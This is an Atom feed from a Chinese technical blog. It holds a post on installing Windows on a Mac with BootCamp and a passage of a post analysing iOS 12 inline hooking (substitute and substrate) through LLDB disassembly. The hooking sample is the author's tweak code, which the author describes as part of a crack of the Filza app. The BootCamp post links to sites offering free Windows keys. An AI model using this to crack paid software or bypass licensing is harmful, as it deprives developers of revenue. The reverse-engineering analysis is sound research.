<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-08-21T17:19:45.591Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BootCamp安装Windows笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/21/mac-install-windows/mac-install-windows/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/21/mac-install-windows/mac-install-windows/</id>
    <published>2019-08-21T05:44:54.000Z</published>
    <updated>2019-08-21T17:19:45.591Z</updated>
    
    <content type="html"><![CDATA[<h3 id="BootCamp安装Windows笔记"><a href="#BootCamp安装Windows笔记" class="headerlink" title="BootCamp安装Windows笔记"></a>BootCamp安装Windows笔记</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>mac安装Windows？这个话题你出来肯定就有人跳出来说，mac装什么Windows？或者说用虚拟机不行吗？这里并不想去讨论这个问题。对于我来说，装Windows双系统主要是为了用IDA。而虚拟机太慢太卡，不太适合，所以我准备用mac装Windows系统试试。这也是我第一次装Windows双系统，基本把所有的坑踩了一遍。如果你现在想装Windows或者正遇到问题，那么这篇笔记应该能解决你的问题。我会尽可能把我在安装过程中遇到的问题以及解决方案都描述清楚。</p><h4 id="BootCamp？"><a href="#BootCamp？" class="headerlink" title="BootCamp？"></a>BootCamp？</h4><p>早就听说在最新的macOS系统版本中，用BootCamp能很简单的安装Windows，既然如此决定先用BootCamp试试。这里你首先需要下载一个Windows的iso镜像文件，我这里提供几个下载的地址</p><ul><li><a href="https://msdn.itellyou.cn/" target="_blank" rel="external">https://msdn.itellyou.cn/</a> </li><li><a href="https://tb.rg-adguard.net/public.php?lang=zh-CN" target="_blank" rel="external">https://tb.rg-adguard.net/public.php?lang=zh-CN</a></li><li><a href="https://www.microsoft.com/zh-cn/software-download/windows10ISO" target="_blank" rel="external">https://www.microsoft.com/zh-cn/software-download/windows10ISO</a> （我是在官网下载的镜像）</li></ul><p>win10镜像准备好以后，用BootCamp装的时候选择该镜像并分配50G的分区。点击下一步，下载完相关驱动以后（连VPN，不然有点慢）进行分区，结果就提示分区失败了。去网上搜了一下，大多数人都说由于最新分区采用的APFS导致得，一堆解决方案。主要都说采用系统降级的方式，或者由于修复time machine造成的分区错误，或者磁盘加密的缘故。但是很明显我刚装的系统不存在这些问题。</p><p>又重新尝试了几次，还是不行，快怀疑苹果BootCamp的问题了。</p><p>还有人提示可以进入单用户模式（command+s）然后用<code>fsck_apfs</code>或者<code>fsck</code>命令去修复磁盘。</p><p>但是上面的都做了以后还是不行。</p><h4 id="启动盘-手动分区"><a href="#启动盘-手动分区" class="headerlink" title="启动盘+手动分区"></a>启动盘+手动分区</h4><p>既然BootCamp自动安装不了，那选择手动安装吧。这个原理也不复杂，BootCamp最主要工作在于下载驱动+分区+引导win系统。然后这些我们实际上可以手动完成。</p><ul><li><p><strong>制作启动盘</strong></p><p>这里可以找一个U盘来制作win10的启动盘，由于我这里是移动硬盘，所以我分了一个10G的区来作为启动盘。这里制作需要<a href="https://unetbootin.github.io/" target="_blank" rel="external">unetbootin</a>来完成制作，这个软件支持mac、win、linux平台。我下载了mac版的。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/mac-install-windows/image-20190822003218038.png?raw=true" width="500" hegiht="187"></p><p>分别选择win10的iso镜像，以及选择对应的设备。如果不清楚你的设备是哪一个，可以输入<code>diskutil list</code>去找到对应的设备名，点击ok等待一会，就这样启动盘就制作完成了。</p></li></ul><ul><li><p><strong>手动分区</strong></p><p>这里的分区是指将mac主硬盘分一个区来安装Windows，由于这里需要安装Windows，所以只能用Windows支持的磁盘格式，最开始我分了一个50G的FAT32分区，然后用启动盘安装发现不能选择该磁盘。后面经过一番研究，才发现。Windows磁盘需要NTFS格式的分区，但是这里有个问题在于mac不支持NTFS格式的操作。于是乎，搜索了一番，发现可以安装一些软件、驱动让mac支持NTFS格式。这里提供两种软件供参考<a href="http://www.ntfsformac.cn/xiazai.html" target="_blank" rel="external">ParagonNTFS</a>和<a href="https://www.tuxera.com/products/tuxera-ntfs-for-mac-cn/" target="_blank" rel="external">tuxera-ntfs</a>但都是收费的。安装完以后终于能分NTFS格式的区了，但是有个头疼的问题在于只能分30G以下才会成功，大于30G就提示失败。但是如果分区是30G的话，启动盘选择磁盘的时候又会提示需要大于40G的磁盘，这里不是矛盾了吗。</p></li></ul><h4 id="重装mac系统"><a href="#重装mac系统" class="headerlink" title="重装mac系统"></a>重装mac系统</h4><p>由于上面手动分区也不行，我就重装了mac系统。由于我之前制作了mojave最新系统的mac启动盘，所以重装还是比较快。建议制作一个mac系统盘备用。这里简单说下制作过程。</p><ul><li>同样给硬盘分一个10G的区</li><li>下载macOS系统，这里比如<code>Install macOS Mojave</code></li><li><code>sudo /Applications/Install\ macOS\ Mojave.app/Contents/Resources/createinstallmedia --volume /Volumes/MyVolume</code>执行里面的createinstallmedia命令，选择上面的分区就制作完成了。</li></ul><p>如果还有问题可以点<a href="https://support.apple.com/zh-cn/HT201372" target="_blank" rel="external">这里</a></p><p>重装完以后，我试了下用BootCamp安装，发现一路畅通，直接到引导了Windows系统安装的步骤，但是这里又有问题了。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/mac-install-windows/image-20190822004521105.png?raw=true" width="500" hegiht="187"></p><p>WTF？你自己刚分好的区，现在又给我说不行了？这里还真没办法。不过我回到macOS用磁盘工具发现，虽然不能安装Windows，但却给我分好了一个NTFS格式的区。既然有了这个区，那我直接用上面制作的启动盘手动安装Windows不就完了。</p><p>重启电脑，按住option按钮，选择那个win启动盘，到选择Windows安装磁盘的步骤，发现BootCamp分的那个区是可以用的，于是我就格式化了那个磁盘，然后选择它，果然安装成功了。这一刻我饱含泪水，终于把Windows安装成功了。经过一番设置，顺利进入win10系统，顺便说下感觉win10还不错，无论是画质还是系统设计，已经比win7好太多。</p><p>当我以为一切就这样结束的时候，发现Windows不能连wifi，不过突然想起，由于我是手动安装的Windows，所以并没有安装相关驱动，导致wifi模块并不能识别。还好BootCamp提供了手动下载驱动支持文件的选项，这里由于需要在win10中访问并运行驱动安装程序，所以我又分了一个FAT32的区专门提供win10访问。把下载的驱动程序放入这个分区，重启进入win10系统，运行里面的安装程序以后，wifi就能连接上了。</p><p>最后我为了体验完整的win10系统，还在淘宝上买了一个激活码，成功激活为正版win10。不过我这里也提供几个免费的key，但不一定可靠，嫌麻烦可以花几块钱去淘宝买。</p><ul><li><a href="https://productkeysdl.com/windows-10-product-key/" target="_blank" rel="external">https://productkeysdl.com/windows-10-product-key/</a></li><li><a href="http://www.ylmfwin100.com/ylmf/8642.html" target="_blank" rel="external">http://www.ylmfwin100.com/ylmf/8642.html</a></li></ul><h4 id="其他资源"><a href="#其他资源" class="headerlink" title="其他资源"></a>其他资源</h4><p>dll缺失文件下载</p><ul><li><p><a href="https://cn.dll-files.com/" target="_blank" rel="external">https://cn.dll-files.com/</a></p></li><li><p><a href="http://www.win10jihuoma.com/archives/8183" target="_blank" rel="external">http://www.win10jihuoma.com/archives/8183</a></p></li></ul><h4 id="最后使用体验"><a href="#最后使用体验" class="headerlink" title="最后使用体验"></a>最后使用体验</h4><p>win10装好以后，体验了下IDA，加载dyld_cache后发现是真的比mac和虚拟机装的IDA流畅很多。也不费我这么多精力去装双系统。不过由于我的mac磁盘一共才256G，所以我下一步的打算是买一个移动SSD硬盘来装Windows，整个系统都运行在外置的SSD硬盘，看了下现在移动固态硬盘的速度，应该是没什么问题的。暂选三星T5、500G、540M/s那款。</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://apple.stackexchange.com/questions/304623/bootcamp-problem-unable-to-partition-the-disk" target="_blank" rel="external">https://apple.stackexchange.com/questions/304623/bootcamp-problem-unable-to-partition-the-disk</a></li><li><a href="https://www.microsoft.com/zh-cn/software-download/windows10ISO" target="_blank" rel="external">https://www.microsoft.com/zh-cn/software-download/windows10ISO</a></li><li><a href="https://www.hongkiat.com/blog/bootcamp-assistant-cannot-partition/" target="_blank" rel="external">https://www.hongkiat.com/blog/bootcamp-assistant-cannot-partition/</a></li><li><a href="http://www.win10jihuoma.com/archives/category/win10zhuanyeban" target="_blank" rel="external">http://www.win10jihuoma.com/archives/category/win10zhuanyeban</a></li><li><a href="https://discussions.apple.com/thread/6832480" target="_blank" rel="external">https://discussions.apple.com/thread/6832480</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;BootCamp安装Windows笔记&quot;&gt;&lt;a href=&quot;#BootCamp安装Windows笔记&quot; class=&quot;headerlink&quot; title=&quot;BootCamp安装Windows笔记&quot;&gt;&lt;/a&gt;BootCamp安装Windows笔记&lt;/h3&gt;&lt;h4 i
      
    
    </summary>
    
      <category term="wiki" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/wiki/"/>
    
    
      <category term="wiki" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/wiki/"/>
    
      <category term="windows" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>iOS12内存patch remap bug分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/16/iOS12-remap-bug-analyze/iOS12-remap-bug-analyze/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/16/iOS12-remap-bug-analyze/iOS12-remap-bug-analyze/</id>
    <published>2019-08-15T16:22:28.000Z</published>
    <updated>2019-08-22T06:24:35.844Z</updated>
    
    <content type="html"><![CDATA[<h3 id="iOS12内存patch-remap-bug分析"><a href="#iOS12内存patch-remap-bug分析" class="headerlink" title="iOS12内存patch remap bug分析"></a>iOS12内存patch remap bug分析</h3><blockquote><p>之前在做LLDB中的内存patch的时候提到在iOS12(包括iOS11)上面remap会出现bug的问题，一直相当困扰。其他hook框架都能在最新越狱上面正常patch，为什么我写的就不行？所以这篇文章准备一探究竟，但是目前我也还么搞清楚原因。不过这里会先分析最新系统上面两张hook框架对于inlinehook的原理及其相关细节。先看下他们的hook框架是如何实现内存patch和hook的。</p></blockquote><h4 id="iOS12-MSHookFunction分析-CoolStar越狱工具"><a href="#iOS12-MSHookFunction分析-CoolStar越狱工具" class="headerlink" title="iOS12 MSHookFunction分析(CoolStar越狱工具)"></a>iOS12 MSHookFunction分析(CoolStar越狱工具)</h4><blockquote><p>环境：iPhoneXS A12 iOS12 jailbreak by Chimera</p></blockquote><p>在iOS12越狱上面<code>CydiaSubstrate</code>指向的是<code>libsubstrate.dylib</code></p><p><code>/Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate -&gt; ../../../usr/lib/libsubstrate.dylib</code></p><p>我们常用的<code>MSHookFunction</code>函数的实现就是在<code>libsubstrate.dylib</code>这里面，不过在这里仅仅是<code>SubHookFunction</code>的封装。而<code>SubHookFunction</code>的实现却是在<code>/usr/lib/libsubstitute.0.dylib</code>这里</p><p><code>/usr/lib/libsubstitute.0.dylib</code>是一个软连接指向<code>libsubstitute.dylib</code>。这里的<code>libsubstitute.dylib</code>就是coolstar维护的版本。下面分析<code>libsubstitute.dylib</code>的inlinehook实现细节。</p><p>下面是我写的一个tweak插件代码（<del>没错就是破解Filza的，不过只是部分代码</del>），hook了<code>_ZTL7624417887</code>函数。</p><pre><code class="c">static BOOL (*original_ZTL7624417887)(int a1, int a2, int a3); BOOL new_ZTL7624417887(int a1, int a2, int a3){    NSLog(@&quot;====xxxx===hook ZTL7624417887---&gt;%d&quot;, 0);    return 0;}%ctor{        MSImageRef  image =  MSGetImageByName(&quot;/Applications/Filza.app/Filza&quot;);    NSLog(@&quot;===xxx===image:%p&quot;, image);    void* ZTL7624417887 = (void*)MSFindSymbol(image, &quot;_ZTL7624417887&quot;);    NSLog(@&quot;===xxx===ZTL7624417887:%p&quot;, ZTL7624417887);    MSHookFunction((void*)ZTL7624417887, (void*)new_ZTL7624417887, (void**)&amp;original_ZTL7624417887);}</code></pre><p><strong>调试分析</strong></p><p>对<code>MSHookFunction</code>下断点，发现断在了我们预想的位置。</p><pre><code>CydiaSubstrate`MSHookFunction:-&gt;  0x10550fca0 &lt;+0&gt;:  cbz    x0, 0x10550fca8           ; &lt;+8&gt;    0x10550fca4 &lt;+4&gt;:  b      0x10550fe80               ; symbol stub for: SubHookFunction    0x10550fca8 &lt;+8&gt;:  ret</code></pre><pre><code>(lldb) re re General Purpose Registers:        x0 = 0x000000010489a068  Filza`ZTL7624417887        x1 = 0x00000001055bbbec  xkfilza.dylib`new_ZTL7624417887(int, int, int) at Tweak.xm:19        x2 = 0x00000001055bc148  xkfilza.dylib`original_ZTL7624417887</code></pre><pre><code>* frame #0: 0x000000010550fca0 CydiaSubstrate`MSHookFunction    frame #1: 0x00000001055bbcd0 xkfilza.dylib`_logosLocalCtor_9eb4d9ed(argc=1, argv=0x000000016b657b50, envp=0x000000016b657b60) at Tweak.xm:29    frame #2: 0x00000001055df56c dyld`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&amp;) + 424    frame #3: 0x00000001055df7ac dyld`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&amp;) + 40</code></pre><p>X0就是hook的函数地址，X1为替换的函数地址，X2为保存的原函数地址。</p><p>先看一下这三个地址的数据，如下所见，此时<code>ZTL7624417887</code>还没有hook，所以前几个指令没有变化。</p><pre><code>// ZTL7624417887 函数指令(lldb) x/5i 0x000000010489a068    0x10489a068: 0xd2800008   mov    x8, #0x0    0x10489a06c: 0xf0003489   adrp   x9, 1683    0x10489a070: 0x911a4129   add    x9, x9, #0x690            ; =0x690     0x10489a074: 0xb868792a   ldr    w10, [x9, x8, lsl #2]    0x10489a078: 0x6b00015f   cmp    w10, w0// new_ZTL7624417887 函数指令(lldb) x/5i 0x00000001055bbbec    0x1055bbbec: 0xd503237f   pacibsp     0x1055bbbf0: 0xd100c3ff   sub    sp, sp, #0x30             ; =0x30     0x1055bbbf4: 0xa9027bfd   stp    x29, x30, [sp, #0x20]    0x1055bbbf8: 0x910083fd   add    x29, sp, #0x20            ; =0x20     0x1055bbbfc: 0xb81fc3a0   stur   w0, [x29, #-0x4]// original_ZTL7624417887 是一个函数指针(lldb) x/5g 0x00000001055bc1480x1055bc148: 0x0000000000000000 0x00000000000000000x1055bc158: 0x0000000000000000 0x00000000000000000x1055bc168: 0x0000000000000000</code></pre><p>这里是我们单步执行两次，使其执行hook函数。这次再观察一下这三个地址的数据</p><pre><code>// ZTL7624417887 函数指令(lldb) x/5i 0x000000010489a068    0x10489a068: 0xb0006911   adrp   x17, 3361    0x10489a06c: 0x912fb231   add    x17, x17, #0xbec          ; =0xbec     0x10489a070: 0xd61f0220   br     x17    0x10489a074: 0xb868792a   ldr    w10, [x9, x8, lsl #2]    0x10489a078: 0x6b00015f   cmp    w10, w0// new_ZTL7624417887 函数指令(lldb) x/5i 0x00000001055bbbec    0x1055bbbec: 0xd503237f   pacibsp     0x1055bbbf0: 0xd100c3ff   sub    sp, sp, #0x30             ; =0x30     0x1055bbbf4: 0xa9027bfd   stp    x29, x30, [sp, #0x20]    0x1055bbbf8: 0x910083fd   add    x29, sp, #0x20            ; =0x20     0x1055bbbfc: 0xb81fc3a0   stur   w0, [x29, #-0x4]// original_ZTL7624417887 是一个函数指针(lldb) x/5g 0x00000001055bc1480x1055bc148: 0x0000000106e38000 0x00000000000000000x1055bc158: 0x0000000000000000 0x00000000000000000x1055bc168: 0x0000000000000000</code></pre><p>这里发现原函数前三个字节和<code>original_ZTL7624417887</code>这个函数指令数据都发生了变化。</p><pre><code class="assembly">0x10489a068: 0xb0006911   adrp   x17, 33610x10489a06c: 0x912fb231   add    x17, x17, #0xbec          ; =0xbec 0x10489a070: 0xd61f0220   br     x17</code></pre><p>这三条指令就是将原始执行流跳转到其他地址（这里也可以发现hook的函数至少大于3条指令，不然会覆盖其他函数）。这里简单计算就可以算出X17目标地址</p><pre><code>(lldb) p/x (0x10489a068 &amp; ~(0x1000-0x1))+ (3361&lt;&lt;12) + 0xbec(long) $3 = 0x00000001055bbbec</code></pre><p>所以会跳转到<code>0x00000001055bbbec</code>这个地址，等等！这个地址不就是<code>new_ZTL7624417887</code>我们hook代码的函数地址吗？所以函数hook就是通过修改前三条指令跳转到我们定义的函数来实现hook的。</p><p>这里还有个问题在于，如果我们在hook代码里面需要执行原函数，那么<code>original_ZTL7624417887</code>处保存的又是什么函数指针？所以这里跟一下<code>0x0000000106e38000</code>这个地址。</p><pre><code>(lldb) x/12i 0x0000000106e38000    0x106e38000: 0xd2800008   mov    x8, #0x0    0x106e38004: 0xd29a0009   mov    x9, #0xd000    0x106e38008: 0xf2a09e49   movk   x9, #0x4f2, lsl #16    0x106e3800c: 0xf2c00029   movk   x9, #0x1, lsl #32    0x106e38010: 0x911a4129   add    x9, x9, #0x690            ; =0x690     0x106e38014: 0xd0fed311   adrp   x17, -9630    0x106e38018: 0x9101d231   add    x17, x17, #0x74           ; =0x74     0x106e3801c: 0xd61f0220   br     x17</code></pre><p>这里可以看出也是一个跳转，可以计算出X17跳转后的地址</p><pre><code>(lldb) p/x (0x106e38014 &amp; ~(0x1000-0x1)) - (9630&lt;&lt;12) + 0x74(long) $4 = 0x000000010489a074</code></pre><p>再等等！这个地址不就是<code>ZTL7624417887</code>函数的第四条指令的地址吗，跳转到这里正好调用了原函数，但是有个问题在于，原函数的前三条指令去哪了？仔细观察上面的指令和原函数的前三条指令</p><pre><code>//原函数前三条指令0x10489a068: 0xd2800008   mov    x8, #0x00x10489a06c: 0xf0003489   adrp   x9, 16830x10489a070: 0x911a4129   add    x9, x9, #0x690            ; =0x690// original_ZTL7624417887函数指针的指令0x106e38000: 0xd2800008   mov    x8, #0x00x106e38004: 0xd29a0009   mov    x9, #0xd0000x106e38008: 0xf2a09e49   movk   x9, #0x4f2, lsl #160x106e3800c: 0xf2c00029   movk   x9, #0x1, lsl #320x106e38010: 0x911a4129   add    x9, x9, #0x690            ; =0x690</code></pre><p>稍加思索就知道，虽然指令不一样，但是结果却是一样的。为什么不直接写入原三条指令呢？这里涉及到<code>adrp</code>这个指令的相对寻址问题。由于<code>adrp</code>会根据当前pc值来计算，这样直接复制的话pc值已经变化，所以这里不得不重新计算X9的值。到这里，<code>MSHookFunction</code>的hook过程我们已经完全清楚了。</p><h4 id="iOS12-MSHookFunction分析-unc0ver越狱工具"><a href="#iOS12-MSHookFunction分析-unc0ver越狱工具" class="headerlink" title="iOS12 MSHookFunction分析(unc0ver越狱工具)"></a>iOS12 MSHookFunction分析(unc0ver越狱工具)</h4><blockquote><p>环境：iPhone6+ iOS12 jailbreak by unc0ver</p></blockquote><p>由于saurik不给CoolStar的越狱工具提供substrate和cydia的支持，导致现在越狱工具出现了两种hook框架。以Coolstar团队基于开源代码substitute和pwn20wnd团队的substrate两种hook框架。上面分析了substitute的hook原理。下面分析substrate的hook相关细节。这里多说两句，关于整个事件，可以访问CoolStar的博客<a href="https://coolstarorg.tumblr.com/" target="_blank" rel="external">https://coolstarorg.tumblr.com/</a>他介绍了整个事件以及自己开发移植substitute的完整过程。我个人来说，还是十分崇拜CoolStar那份创新和坚持。自己动手完成了最新越狱的substitute移植，tweak注入，以及Sileo的开发。在这中间的过程，正如他在博客里面提到的那样，十分曲折，令人佩服。</p><p>在unc0ver中有如下dylib和hook相关</p><pre><code>/usr/lib/substrate/SubstrateInserter.dylib/usr/lib/libsubstrate.dylib/Library/MobileSubstrate/MobileSubstrate.dylib/Library/Caches/cy-8lteBy.dylib</code></pre><p>作为对比，这里同样以上面的tweak代码为例，hook了<code>_ZTL7624417887</code>函数。</p><pre><code class="c">static BOOL (*original_ZTL7624417887)(int a1, int a2, int a3); BOOL new_ZTL7624417887(int a1, int a2, int a3){    NSLog(@&quot;====xxxx===hook ZTL7624417887---&gt;%d&quot;, 0);    return 0;}%ctor{        MSImageRef  image =  MSGetImageByName(&quot;/Applications/Filza.app/Filza&quot;);    NSLog(@&quot;===xxx===image:%p&quot;, image);    void* ZTL7624417887 = (void*)MSFindSymbol(image, &quot;_ZTL7624417887&quot;);    NSLog(@&quot;===xxx===ZTL7624417887:%p&quot;, ZTL7624417887);    MSHookFunction((void*)ZTL7624417887, (void*)new_ZTL7624417887, (void**)&amp;original_ZTL7624417887);}</code></pre><p><strong>调试分析</strong></p><p>对<code>MSHookFunction</code>下断点，发现断在了如下位置</p><pre><code>// 调用栈*libsubstrate.dylib`MSHookFunction SubstrateInserter.dylib`___lldb_unnamed_symbol6$$SubstrateInserter.dylib + 76 cy-8lteBy.dylib`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&amp;) + 412 cy-8lteBy.dylib`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&amp;) + 36//下面可以看出来是hook了posix_spawn这个函数x0 = 0x00000001be287310  libsystem_kernel.dylib`posix_spawnx1 = 0x000000010194a4c0  SubstrateInserter.dylib`___lldb_unnamed_symbol2x2 = 0x0000000101950258</code></pre><p>这里可以暂时不用管，同样下面的hook函数都忽略先。</p><pre><code>//================================ execve ========================================//调用栈*libsubstrate.dylib`MSHookFunction SubstrateInserter.dylib`___lldb_unnamed_symbol6$$SubstrateInserter.dylib + 100 cy-8lteBy.dylib`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&amp;) + 412 cy-8lteBy.dylib`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&amp;) + 36//下面可以看出来是hook了execve这个函数x0 = 0x00000001be290034  libsystem_kernel.dylib`execvex1 = 0x000000010194a4fc  SubstrateInserter.dylib`___lldb_unnamed_symbol3x2 = 0x0000000101950260  //================================ __vfork ========================================//调用栈*libsubstrate.dylib`MSHookFunction cy-8lteBy.dylib`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&amp;) + 412 cy-8lteBy.dylib`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&amp;) + 36//下面可以看出来是hook了__vfork这个函数x0 = 0x00000001be28fa80  libsystem_kernel.dylib`__vforkx1 = 0x000000010194a5d4  SubstrateInserter.dylib`___lldb_unnamed_symbol4x2 = 0x0000000101950268</code></pre><p>通过上面可以看出，substrate会hook一些多进程启动相关的函数。这里我们都暂时不用分析，进行执行就到了我们自己写的hook点。</p><pre><code>x0 = 0x0000000100f52068  Filza`ZTL7624417887x1 = 0x0000000104a3fba4  xkfilza.dylib`new_ZTL7624417887(int, int, int) at Tweak.xm:19x2 = 0x0000000104a40148  xkfilza.dylib`original_ZTL7624417887libsubstrate.dylib`MSHookFunction:-&gt;  0x101d244dc &lt;+0&gt;:   stp    x29, x30, [sp, #-0x10]!    0x101d244e0 &lt;+4&gt;:   mov    x29, sp    0x101d244e4 &lt;+8&gt;:   stp    x20, x19, [sp, #-0x10]!    0x101d244e8 &lt;+12&gt;:  stp    x22, x21, [sp, #-0x10]!    0x101d244ec &lt;+16&gt;:  sub    sp, sp, #0x20             ; =0x20     0x101d244f0 &lt;+20&gt;:  mov    x21, x2    0x101d244f4 &lt;+24&gt;:  mov    x19, x1    0x101d244f8 &lt;+28&gt;:  mov    x20, x0    0x101d244fc &lt;+32&gt;:  cbz    x20, 0x101d24514          ; &lt;+56&gt;    0x101d24500 &lt;+36&gt;:  mov    x1, #0x0    0x101d24504 &lt;+40&gt;:  mov    x0, x19    0x101d24508 &lt;+44&gt;:  bl     0x101d29150               ; symbol223$$libsubstrate.dylib    0x101d2450c &lt;+48&gt;:  cmp    x0, #0x0                  ; =0x0     0x101d24510 &lt;+52&gt;:  csel   x19, x0, x19, ne    0x101d24514 &lt;+56&gt;:  adrp   x8, 265    0x101d24518 &lt;+60&gt;:  add    x8, x8, #0x498            ; =0x498     0x101d2451c &lt;+64&gt;:  ldrb   w8, [x8]    0x101d24520 &lt;+68&gt;:  cbz    w8, 0x101d24538           ; &lt;+92&gt;    0x101d24524 &lt;+72&gt;:  str    x19, [sp]    0x101d24528 &lt;+76&gt;:  adr    x1, #0xc8d10              ; &quot;  &lt;=  %p&quot;    0x101d2452c &lt;+80&gt;:  nop        0x101d24530 &lt;+84&gt;:  orr    w0, wzr, #0x2    0x101d24534 &lt;+88&gt;:  bl     0x101d10ad4               ; symbol80$$libsubstrate.dylib    0x101d24538 &lt;+92&gt;:  adrp   x8, 240    0x101d2453c &lt;+96&gt;:  add    x8, x8, #0xa80            ; =0xa80     0x101d24540 &lt;+100&gt;: add    x8, x8, #0x10             ; =0x10     0x101d24544 &lt;+104&gt;: stp    x21, x8, [sp, #0x8]    0x101d24548 &lt;+108&gt;: cmp    x21, #0x0                 ; =0x0     0x101d2454c &lt;+112&gt;: add    x8, sp, #0x8              ; =0x8     0x101d24550 &lt;+116&gt;: csel   x8, xzr, x8, eq    0x101d24554 &lt;+120&gt;: str    x8, [sp, #0x18]    0x101d24558 &lt;+124&gt;: mov    x0, #0x0    0x101d2455c &lt;+128&gt;: add    x4, sp, #0x10             ; =0x10     0x101d24560 &lt;+132&gt;: mov    x1, x20    0x101d24564 &lt;+136&gt;: mov    x2, x20    0x101d24568 &lt;+140&gt;: mov    x3, x19    0x101d2456c &lt;+144&gt;: bl     0x101d23f3c                           ;&lt;----------------hook实现函数    0x101d24570 &lt;+148&gt;: sub    sp, x29, #0x20            ; =0x20     0x101d24574 &lt;+152&gt;: ldp    x22, x21, [sp], #0x10    0x101d24578 &lt;+156&gt;: ldp    x20, x19, [sp], #0x10    0x101d2457c &lt;+160&gt;: ldp    x29, x30, [sp], #0x10    0x101d24580 &lt;+164&gt;: ret</code></pre><p>从这里就可以看出和substitute的差别还是挺大的。先看下hook前三个地址的数据情况</p><pre><code>// ZTL7624417887 函数指令(lldb) x/5i 0x0000000100f52068    0x100f52068: 0xd2800008   mov    x8, #0x0    0x100f5206c: 0xf0003489   adrp   x9, 1683    0x100f52070: 0x911a4129   add    x9, x9, #0x690            ; =0x690     0x100f52074: 0xb868792a   ldr    w10, [x9, x8, lsl #2]    0x100f52078: 0x6b00015f   cmp    w10, w0// new_ZTL7624417887 函数指令(lldb) x/5i 0x0000000104a3fba4    0x104a3fba4: 0xd100c3ff   sub    sp, sp, #0x30             ; =0x30     0x104a3fba8: 0xa9027bfd   stp    x29, x30, [sp, #0x20]    0x104a3fbac: 0x910083fd   add    x29, sp, #0x20            ; =0x20     0x104a3fbb0: 0xb81fc3a0   stur   w0, [x29, #-0x4]    0x104a3fbb4: 0xb81f83a1   stur   w1, [x29, #-0x8]// original_ZTL7624417887 是一个函数指针(lldb) x/5g 0x0000000104a401480x104a40148: 0x0000000000000000 0x00000000000000000x104a40158: 0x0000000000000000 0x00000000000000000x104a40168: 0x0000000000000000</code></pre><p>下面我们执行完这个函数，再观察hook以后三个地址的数据情况</p><pre><code>// ZTL7624417887 函数指令(lldb) x/10i 0x0000000100f52068    0x100f52068: 0x58000050   ldr    x16, #0x8                 ; &lt;+8&gt;    0x100f5206c: 0xd61f0200   br     x16    0x100f52070: 0x7ff00040   .long  0x7ff00040                ; unknown opcode    0x100f52074: 0x00000001   .long  0x00000001                ; unknown opcode    0x100f52078: 0x6b00015f   cmp    w10, w0    0x100f5207c: 0x540000c0   b.eq   0x100f52094               ; &lt;+44&gt;    0x100f52080: 0x91000508   add    x8, x8, #0x1              ; =0x1     0x100f52084: 0xf100311f   cmp    x8, #0xc                  ; =0xc     0x100f52088: 0x54ffff69   b.ls   0x100f52074               ; &lt;+12&gt;    0x100f5208c: 0x52800008   mov    w8, #0x0// new_ZTL7624417887 函数指令(lldb)  x/5i 0x0000000104a3fba4    0x104a3fba4: 0xd100c3ff   sub    sp, sp, #0x30             ; =0x30     0x104a3fba8: 0xa9027bfd   stp    x29, x30, [sp, #0x20]    0x104a3fbac: 0x910083fd   add    x29, sp, #0x20            ; =0x20     0x104a3fbb0: 0xb81fc3a0   stur   w0, [x29, #-0x4]    0x104a3fbb4: 0xb81f83a1   stur   w1, [x29, #-0x8]// original_ZTL7624417887 是一个函数指针(lldb) x/5g 0x0000000104a401480x104a40148: 0x0000000104a53fe8 0x00000000000000000x104a40158: 0x0000000000000000 0x00000000000000000x104a40168: 0x0000000000000000</code></pre><p>这里可以发现，和substitute一样，原函数ZTL7624417887和original_ZTL7624417887函数都发生了变化，但是ZTL7624417887的改动却不一样。substrate这里首先占用了四条指令大小（这里也可以知道用substate进行hook的时候函数至少满足4个字节），其中后两条指令其实是存得一个地址占用8个字节。</p><pre><code>(lldb) x/g 0x100f520700x100f52070: 0x000000017ff00040</code></pre><p>按地址大小解析出来，目标跳转的地址为<code>0x000000017ff00040</code>现在去看下这个地址里面是什么</p><pre><code>(lldb) x/12i 0x000000017ff00040    0x17ff00040: 0x10020010   adr    x16, #0x4000    0x17ff00044: 0xa9404610   ldp    x16, x17, [x16]    0x17ff00048: 0xd61f0220   br     x17    0x17ff0004c: 0xd503201f   nop        0x17ff00050: 0x10020010   adr    x16, #0x4000    0x17ff00054: 0xa9404610   ldp    x16, x17, [x16]    0x17ff00058: 0xd61f0220   br     x17    0x17ff0005c: 0xd503201f   nop        0x17ff00060: 0x10020010   adr    x16, #0x4000    0x17ff00064: 0xa9404610   ldp    x16, x17, [x16]    0x17ff00068: 0xd61f0220   br     x17    0x17ff0006c: 0xd503201f   nop</code></pre><p>这里可以发现又会进行一些跳转</p><pre><code>(lldb) p/x 0x17ff00040+0x4000(long) $2 = 